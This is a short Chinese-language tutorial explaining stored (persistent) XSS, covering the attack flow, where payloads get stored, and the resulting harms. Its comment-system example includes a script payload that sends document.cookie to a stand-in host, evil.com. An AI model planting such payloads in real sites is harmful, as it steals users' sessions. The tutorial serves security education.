# 存储型XSS

存储型 XSS（Stored XSS），也叫 **持久型 XSS**，是最危险的 XSS 类型之一。它会将恶意脚本**永久存储在目标服务器的数据库或文件中**，任何访问该数据的用户都会被攻击。

---

## 1. 存储型 XSS

存储型 XSS 是指：攻击者提交的恶意脚本被服务器保存（如数据库、日志、评论、文章等），当其他用户访问这些内容时，脚本自动执行，从而造成恶意行为，如：

- 劫持 Cookie 会话
- 冒充用户身份进行操作（CSRF + XSS）
- 页面篡改
- 静默盗号
- 弹窗钓鱼
- 挖矿、键盘监听等

---

## 2. 攻击原理流程

1. **攻击者提交恶意脚本**
    - 例如，在文章评论中注入 `<script>alert(document.cookie)</script>`

2. **服务器保存数据**
    - 服务端将脚本存入数据库，没有进行任何过滤或转义

3. **用户访问页面**
    - 正常用户浏览该页面时，恶意 JS 被浏览器解析执行

4. **攻击生效**
    - 可能弹窗、劫 cookie、自动请求攻击等

---

## 3. 常见的存储位置

| 类型         | 存储点                    |
|--------------|---------------------------|
| 数据库       | 评论、留言、昵称、签名等  |
| 文件         | 日志文件、JSON配置文件    |
| NoSQL/对象存储 | MongoDB、Firebase、S3等  |
| 本地缓存     | Redis、Session、Cookie    |

---

## 4. 示例：评论系统中的存储型 XSS

### 攻击者提交评论：

```html
<script>fetch("http://evil.com/steal?c=" + document.cookie)</script>
```

### 后端保存到数据库：

```sql
INSERT INTO comments (content) VALUES ('<script>fetch(...)</script>');
```

### 页面展示（未转义）：

```html
<div class="comment">
  <script>fetch(...)</script>  ← 浏览器执行
</div>
```

---

## 5. 危害详解

| 危害 | 描述 |
|------|------|
| **劫持用户会话** | 获取 cookie，伪造登录态 |
| **键盘监听** | 记录用户输入（账号、密码） |
| **虚假表单** | 模拟页面钓鱼欺诈 |
| **黑链注入** | 提升黑站权重、挂马 |
| **DDoS跳板** | 加入恶意 JS 请求群体攻击 |
| **CSRF联动攻击** | 脚本内触发后台接口操作 |

---




